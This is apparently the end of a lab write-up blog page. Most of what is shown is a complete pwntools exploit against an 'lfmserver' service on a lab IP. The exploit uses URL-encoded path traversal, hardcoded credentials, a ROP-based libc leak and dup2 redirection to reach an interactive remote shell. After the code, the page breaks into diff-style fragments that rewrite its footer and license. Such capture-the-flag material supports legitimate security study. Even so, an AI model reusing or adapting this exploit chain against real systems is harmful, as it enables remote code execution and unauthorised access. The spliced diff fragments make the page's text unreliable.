class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span> <span class="keyword">or</span> sys.argv[<span class="number">1</span>] <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">'local'</span>, <span class="string">'remote'</span>]:</span><br><span class="line">    print(<span class="string">"Usage: &#123;sys.argv[0]&#125; [target]\n  target is local or remote\n"</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line">target = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">### Context</span></span><br><span class="line">lfmserver = ELF(<span class="string">'./lfmserver'</span>)</span><br><span class="line"><span class="keyword">if</span> target == <span class="string">'local'</span>:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>, checksec=<span class="keyword">False</span>)</span><br><span class="line">    ip = <span class="string">'127.0.0.1'</span></span><br><span class="line">    port = <span class="number">5000</span></span><br><span class="line">    one_gadget_offset = <span class="number">0xc84da</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment">#libc = ELF('/home/miao/Desktop/libc-database/db/libc6_2.28-0ubuntu1_amd64.so', checksec=False)</span></span><br><span class="line">    libc = ELF(<span class="string">"./libc-2.28.so"</span>)</span><br><span class="line">    ip = <span class="string">'10.10.10.173'</span></span><br><span class="line">    port = <span class="number">8888</span></span><br><span class="line">    one_gadget_offset = <span class="number">0x501e3</span></span><br><span class="line">sock_fd = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Gadgets and payload template</span></span><br><span class="line">pop_rdi = p64(<span class="number">0x0000000000405c4b</span>)</span><br><span class="line">pop_rsi_r15 = p64(<span class="number">0x0000000000405c49</span>)</span><br><span class="line">payload = <span class="string">"CHECK /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd%xx"</span> + <span class="string">"a"</span> * <span class="number">125</span> + <span class="string">"&#123;&#125; LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\n"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Stage 1: libc leak</span></span><br><span class="line">rop = pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(lfmserver.got[<span class="string">'socket'</span>]) + p64(<span class="number">0</span>) + p64(lfmserver.plt[<span class="string">'write'</span>])</span><br><span class="line"></span><br><span class="line">p = remote(ip, port)</span><br><span class="line">p.sendline(payload.format(urllib.parse.quote(rop)))</span><br><span class="line">data = p.recvall()</span><br><span class="line">socket_addr = u64(data.split(<span class="string">b'\n'</span>)[<span class="number">1</span>][:<span class="number">8</span>].ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">log.info(<span class="string">"Found socket address:          0x&#123;socket_addr:016x&#125;"</span>)</span><br><span class="line">libc_base_addr = socket_addr - libc.symbols[<span class="string">'socket'</span>]</span><br><span class="line">log.info(<span class="string">"Calculated libc base address:  0x&#123;libc_base_addr:016x&#125;"</span>)</span><br><span class="line">one_gadget_addr = libc_base_addr + one_gadget_offset</span><br><span class="line">log.info(<span class="string">"Calculated one gadget address: 0x&#123;one_gadget_addr:016x&#125;"</span>)</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment">### Stage 2: Shell</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line">rop = pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(lfmserver.plt[<span class="string">'dup2'</span>])</span><br><span class="line">rop += pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(lfmserver.plt[<span class="string">'dup2'</span>])</span><br><span class="line">rop += pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(<span class="number">2</span>) + p64(<span class="number">0</span>) + p64(lfmserver.plt[<span class="string">'dup2'</span>])</span><br><span class="line">rop += p64(one_gadget_addr)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Sending stage two rop"</span>)</span><br><span class="line">p.sendline(payload.format(urllib.parse.quote(rop)))</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">22</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
@@ -589,7 +372,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2020-05-21T05:05:45.669Z" itemprop="dateUpdated">2020-05-21 13:05:45</time>
+    Last updated: <time datetime="2020-05-21T05:05:45.669Z" itemprop="dateUpdated">2020-05-21 13:05:45</time>
 </span><br>
 
 
@@ -756,11 +539,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
